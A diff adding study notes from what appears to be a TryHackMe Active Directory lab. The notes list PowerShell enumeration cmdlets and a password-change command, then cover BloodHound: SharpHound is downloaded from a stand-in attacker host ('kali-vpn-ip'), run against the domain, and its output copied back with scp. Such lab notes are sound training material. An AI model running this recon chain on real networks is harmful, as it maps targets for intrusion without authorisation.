@@ -47,3 +47,68 @@ net group "Tier 1 Admins" /domain
 
 net accounts /domain
 
+### USER ENUMERATION
+
+get-ADuser
+get-ADGroup
+Get-ADGroupMember
+Get-ADObject
+
+A more generic search for any AD objects can be performed using the Get-ADObject cmdlet. For example, if we are looking for all AD objects that were changed after a specific date:
+
+PS C:\> $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)
+PS C:\> Get-ADObject -Filter 'whenChanged -gt $ChangeDate' -includeDeletedObjects -Server za.tryhackme.com
+
+Get-ADObject -Filter 'badPwdCount -gt 0' -Server za.tryhackme.com
+
+Get-ADDomain
+et-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext "old" -force) -NewPassword (ConvertTo-SecureString -AsPlainText "new" -Force)
+
+ Get-ADUser -Identity Beth.Nolan -properties *
+
+  CN=annette.manning,OU=Marketing,OU=People,DC=za,DC=tryhackme,DC=com
+
+Get-ADGroup -Identity "Tier 2 Admins"
+get-aduser -Identity beth.nolan -Properties * |Select-object 'Title'
+
+### using bloodhound
+
+Bloodhound is the software that runs locally on an attacker's machine. The attacker must run a "collector" on a target where it will enumerate lots of information about the domain. After the collector finishes running, it will output a series of .json files for import into the attacker's Bloodhound interface.
+
+`wget https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip`
+
+sudo python3 -m http.server 80
+
+on windows pc
+
+```
+cd ~/Documents
+
+# Download the .zip file from Kali
+Invoke-WebRequest http://kali-vpn-ip/SharpHound-v1.1.0.zip -OutFile SharpHound-v1.1
+.0.zip
+
+# Unzip the archive with PowerShell
+Expand-Archive SharpHound-v1.1.0.zip
+cd SharpHound-v1.1.0
+```
+
+.\SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs
+
+scp username@za.tryhackme.com@thmjmp1.za.tryhackme.com:C:/Users/username/Documents/SharpHound-v1.1.0/20220805005305_BloodHound.zip .
+
+neo4j console &
+bloodhound &
+
+    You can use the Search for a node... area to find specific users, groups, etc.
+    You can click on specific properties of the object to graph things out (eg. group memberships)
+    You can use the Analysis tab to run built-in queries (or write your own)
+    Much, much more
+
+`SharpHound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs`
+
+4
+
+
+
+
